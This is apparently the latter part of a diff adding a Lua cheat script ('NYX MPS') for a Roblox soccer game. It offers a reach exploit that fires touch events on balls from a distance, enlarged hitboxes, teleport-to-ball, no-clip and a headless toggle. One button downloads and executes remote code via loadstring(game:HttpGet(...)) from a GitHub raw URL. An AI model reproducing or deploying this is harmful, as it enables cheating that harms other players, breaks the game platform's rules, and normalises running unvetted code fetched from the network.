+                        RightLeg.Position = Character.PrimaryPart.Position + Vector3.new(0.5, -2, 0)
+                    end
+                end
+
+                Hitbox.Touched:Connect(function(hit)
+                    if hit:IsA("Part") and hit.Name == "TPS" then
+                        IsTouchingTPS = true
+                        adjustLegs()
+                    end
+                end)
+                Hitbox.TouchEnded:Connect(function(hit)
+                    if hit:IsA("Part") and hit.Name == "TPS" then
+                        IsTouchingTPS = false
+                        resetLegs()
+                    end
+                end)
+                hitboxConnection = RunService.Heartbeat:Connect(function()
+                    if Character and RootPart and Hitbox then
+                        Hitbox.Position = RootPart.Position
+                        adjustLegs()
+                    end
+                end)
+            end
+
+            createToggle(Content, UDim2.new(0.05, 0, 0.35, 0), "Hitbox", function(state)
+                hitboxEnabled = state
+                if hitboxEnabled then
+                    createHitbox()
+                    CoreGui:SetCore("SendNotification", {Title = "Hitbox", Text = "Hitbox Enabled!", Duration = 2})
+                else
+                    if Hitbox then Hitbox:Destroy() Hitbox = nil end
+                    if hitboxConnection then hitboxConnection:Disconnect() hitboxConnection = nil end
+                    IsTouchingTPS = false
+                    local resetCharacter = Player.Character or Player.CharacterAdded:Wait()
+                    local resetLeftLeg = resetCharacter:FindFirstChild("Left Leg") or resetCharacter:FindFirstChild("LeftLowerLeg")
+                    local resetRightLeg = resetCharacter:FindFirstChild("Right Leg") or resetCharacter:FindFirstChild("RightLowerLeg")
+                    if resetLeftLeg and resetRightLeg and resetCharacter.PrimaryPart then
+                        resetLeftLeg.Position = resetCharacter.PrimaryPart.Position + Vector3.new(-0.5, -2, 0)
+                        resetRightLeg.Position = resetCharacter.PrimaryPart.Position + Vector3.new(0.5, -2, 0)
+                    end
+                    CoreGui:SetCore("SendNotification", {Title = "Hitbox", Text = "Hitbox Disabled!", Duration = 2})
+                end
+            end)
+
+            createSlider(Content, UDim2.new(0.05, 0, 0.5, 0), "Hitbox Size", 1, 20, 8, function(value)
+                hitboxSize = value
+                if hitboxEnabled and Hitbox then
+                    Hitbox.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
+                end
+            end)
+
+            Player.CharacterAdded:Connect(function()
+                if hitboxEnabled then
+                    createHitbox()
+                end
+            end)
+        end
+
+        local balls = {}
+        local lastrefreshtime = os.time()
+        local currentleg = true
+        local touchint = {}
+
+        local function refreshballs(force)
+            if not force and (lastrefreshtime + 1.5) > os.time() then return end
+            table.clear(touchint)
+            local character = Player.Character
+            if character then
+                for _, v in pairs(character:GetDescendants()) do
+                    if v.Name == "TouchInterest" and v.Parent:IsA("BasePart") then
+                        table.insert(touchint, v)
+                    end
+                end
+            end
+            lastrefreshtime = os.time()
+            table.clear(balls)
+            for _, v in pairs(workspace:GetDescendants()) do
+                local firstletter = string.sub(v.Name, 1, 1)
+                if v.Name == "TPS" or v.Name == "AIFA" or v.Name == "CSF" or v.Name == "VCL" or v.Name == "MPS" or
+                   v.Name == "VFA" or v.Name == "OFA" or v.Name == "IFF" or v.Name == "VEF" or v.Name == "Fix" or
+                   v.Name == "LIR" or v.Name == "UPL" or v.Name == "" or firstletter == "{" then
+                    table.insert(balls, v)
+                end
+            end
+        end
+
+        refreshballs(true)
+
+        UserInputService.InputBegan:Connect(function(i, gameProcessedEvent)
+            if i.KeyCode == Enum.KeyCode.W or i.KeyCode == Enum.KeyCode.A or i.KeyCode == Enum.KeyCode.S or
+               i.KeyCode == Enum.KeyCode.D or i.KeyCode == Enum.KeyCode.Space then
+                return
+            end
+            if not gameProcessedEvent then
+                if i.KeyCode == Enum.KeyCode.LeftControl then
+                    currentleg = not currentleg
+                end
+                if i.KeyCode == Enum.KeyCode.PageUp or i.KeyCode == Enum.KeyCode.PageDown then
+                    if i.KeyCode == Enum.KeyCode.PageDown then
+                        reach = reach - 0.25
+                    else
+                        reach = reach + 0.25
+                    end
+                    CoreGui:SetCore("SendNotification", {Title = "ReachScript", Text = "Reach set to: " .. reach, Duration = 0.5})
+                else
+                    refreshballs(false)
+                end
+                if toggleState and Player.Character and Player.Character:FindFirstChild("Right Leg") then
+                    local rightLegPos = Player.Character["Right Leg"].Position
+                    for _, e in pairs(balls) do
+                        if (e.Position - rightLegPos).Magnitude <= reach then
+                            for _, v in pairs(touchint) do
+                                if v.Parent ~= Player.Character['Head'] then
+                                    task.spawn(function()
+                                        firetouchinterest(e, v.Parent, 0)
+                                        firetouchinterest(e, v.Parent, 1)
+                                    end)
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+
+        return Content
+    end
+
+    local function createMiscTab()
+        local Content = Instance.new("Frame")
+        Content.Size = UDim2.new(1, 0, 1, 0)
+        Content.BackgroundTransparency = 1
+        Content.Parent = ContentFrame
+        Content.Visible = false
+
+        local character = Player.Character or Player.CharacterAdded:Wait()
+        local head = character:FindFirstChild("Head")
+        local function setHeadVisibility(state)
+            if head then
+                for _, v in pairs(head:GetChildren()) do
+                    if v:IsA("Decal") then
+                        v.Transparency = state and 1 or 0
+                    end
+                end
+                head.Transparency = state and 1 or 0
+            end
+        end
+
+        createToggle(Content, UDim2.new(0.05, 0, 0.05, 0), "Headless", function(state)
+            setHeadVisibility(state)
+        end)
+
+        createButton(Content, UDim2.new(0.05, 0, 0.2, 0), "Infinite Yield", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
+        end)
+
+        createSlider(Content, UDim2.new(0.05, 0, 0.35, 0), "FOV Changer", 70, 120, 70, function(value)
+            getgenv().fov = value
+            game:GetService("Workspace").CurrentCamera.FieldOfView = getgenv().fov
+        end)
+
+        return Content
+    end
+
+    local function createSpecialTab()
+        local Content = Instance.new("Frame")
+        Content.Size = UDim2.new(1, 0, 1, 0)
+        Content.BackgroundTransparency = 1
+        Content.Parent = ContentFrame
+        Content.Visible = false
+
+        local balls = {}
+        local lastrefreshtime = os.time()
+        
+        local function refreshballs(force)
+            if not force and (lastrefreshtime + 1.5) > os.time() then return end
+            table.clear(balls)
+            for _, v in pairs(workspace:GetDescendants()) do
+                local firstletter = string.sub(v.Name, 1, 1)
+                if v.Name == "TPS" or v.Name == "AIFA" or v.Name == "CSF" or v.Name == "VCL" or v.Name == "MPS" or
+                   v.Name == "VFA" or v.Name == "OFA" or v.Name == "IFF" or v.Name == "VEF" or v.Name == "Fix" or
+                   v.Name == "LIR" or v.Name == "UPL" or v.Name == "UFA" or firstletter == "{" then
+                    table.insert(balls, v)
+                end
+            end
+            lastrefreshtime = os.time()
+        end
+
+        refreshballs(true)
+
+        createButton(Content, UDim2.new(0.05, 0, 0.05, 0), "Teleport to Ball", function()
+            local character = Player.Character
+            if character and #balls > 0 then
+                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+                if humanoidRootPart then
+                    humanoidRootPart.CFrame = CFrame.new(balls[1].Position + Vector3.new(0, 3, 0))
+                    CoreGui:SetCore("SendNotification", {Title = "Teleport", Text = "Teleported to ball!", Duration = 2})
+                else
+                    CoreGui:SetCore("SendNotification", {Title = "Teleport Failed", Text = "HumanoidRootPart not found.", Duration = 2})
+                end
+            else
+                CoreGui:SetCore("SendNotification", {Title = "Teleport Failed", Text = "No ball found.", Duration = 2})
+            end
+        end)
+
+        createToggle(Content, UDim2.new(0.05, 0, 0.2, 0), "No-Clip", function(state)
+            local character = Player.Character or Player.CharacterAdded:Wait()
+            if character then
+                for _, part in pairs(character:GetChildren()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = not state
+                    end
+                end
+                CoreGui:SetCore("SendNotification", {Title = "No-Clip", Text = state and "No-Clip Enabled!" or "No-Clip Disabled!", Duration = 2})
+            end
+        end)
+
+        return Content
+    end
+
+    local function createChangeLogsTab()
+        local Content = Instance.new("Frame")
+        Content.Size = UDim2.new(1, 0, 1, 0)
+        Content.BackgroundTransparency = 1
+        Content.Parent = ContentFrame
+        Content.Visible = false
+
+        local LogText = Instance.new("TextLabel")
+        LogText.Size = UDim2.new(0.9, 0, 0.9, 0)
+        LogText.Position = UDim2.new(0.05, 0, 0.05, 0)
+        LogText.BackgroundTransparency = 1
+        LogText.Text = "Update 4/4/25\n+ UI improvements for better usability\n+ Fixed bugs\n+ ball teleportation fixed :)"
+        LogText.TextColor3 = Color3.fromRGB(255, 255, 255)
+        LogText.TextSize = (isMobile and 12) or 14
+        LogText.Font = Enum.Font.Gotham
+        LogText.TextXAlignment = Enum.TextXAlignment.Left
+        LogText.TextYAlignment = Enum.TextYAlignment.Top
+        LogText.Parent = Content
+
+        return Content
+    end
+
+    local function createSettingsTab()
+        local Content = Instance.new("Frame")
+        Content.Size = UDim2.new(1, 0, 1, 0)
+        Content.BackgroundTransparency = 1
+        Content.Parent = ContentFrame
+        Content.Visible = false
+
+        local currentHotkey = Enum.KeyCode.F4
+        local uiVisible = true
+
+        local HotkeyLabel = Instance.new("TextLabel")
+        HotkeyLabel.Size = UDim2.new(0.9, 0, 0, (isMobile and 20) or 30)
+        HotkeyLabel.Position = UDim2.new(0.05, 0, 0.05, 0)
+        HotkeyLabel.BackgroundTransparency = 1
+        HotkeyLabel.Text = "Current UI Toggle Hotkey: " .. currentHotkey.Name
+        HotkeyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        HotkeyLabel.TextSize = (isMobile and 14) or 16
+        HotkeyLabel.Font = Enum.Font.Gotham
+        HotkeyLabel.TextXAlignment = Enum.TextXAlignment.Left
+        HotkeyLabel.Parent = Content
+
+        local ChangeHotkeyButton = createButton(Content, UDim2.new(0.05, 0, 0.2, 0), "Change Hotkey", function()
+            HotkeyLabel.Text = "Press a key to set new hotkey..."
+            local connection
+            connection = UserInputService.InputBegan:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.Keyboard then
+                    currentHotkey = input.KeyCode
+                    HotkeyLabel.Text = "Current UI Toggle Hotkey: " .. currentHotkey.Name
+                    connection:Disconnect()
+                    CoreGui:SetCore("SendNotification", {
+                        Title = "Hotkey Updated",
+                        Text = "UI toggle set to: " .. currentHotkey.Name,
+                        Duration = 2
+                    })
+                end
+            end)
+        end)
+
+        UserInputService.InputBegan:Connect(function(input)
+            if input.KeyCode == currentHotkey then
+                uiVisible = not uiVisible
+                MainFrame.Visible = uiVisible
+                CoreGui:SetCore("SendNotification", {
+                    Title = "UI Toggle",
+                    Text = uiVisible and "UI Shown" or "UI Hidden",
+                    Duration = 1
+                })
+            end
+        end)
+
+        return Content
+    end
+
+    local tabOrder = {
+        {name = "Main", creator = createMainTab},
+        {name = "Misc", creator = createMiscTab},
+        {name = "Special", creator = createSpecialTab},
+        {name = "Change Logs", creator = createChangeLogsTab},
+        {name = "Settings", creator = createSettingsTab}
+    }
+
+    local contents = {}
+    for i, tab in ipairs(tabOrder) do
+        local content = tab.creator()
+        contents[tab.name] = content
+        createTab(tab.name, function() return content end, i - 1)
+    end
+
+    local firstTabButton = TabFrame:GetChildren()[1]
+    if firstTabButton and firstTabButton:IsA("TextButton") then
+        firstTabButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+        local firstTextLabel = firstTabButton:FindFirstChild("TextLabel")
+        local firstHighlightBar = firstTabButton:FindFirstChild("HighlightBar")
+        if firstTextLabel then firstTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255) end
+        if firstHighlightBar then firstHighlightBar.BackgroundTransparency = 0 end
+        selectedTab = firstTabButton
+        contents['Main'].Visible = true
+    end
+
+    CoreGui:SetCore("SendNotification", {Title = "Script Loaded", Text = "Enjoy! Toggle UI with F4", Duration = 5})
+    print("NYX MPS Script loaded successfully!")
+    print("97rn was here :)")
+end)
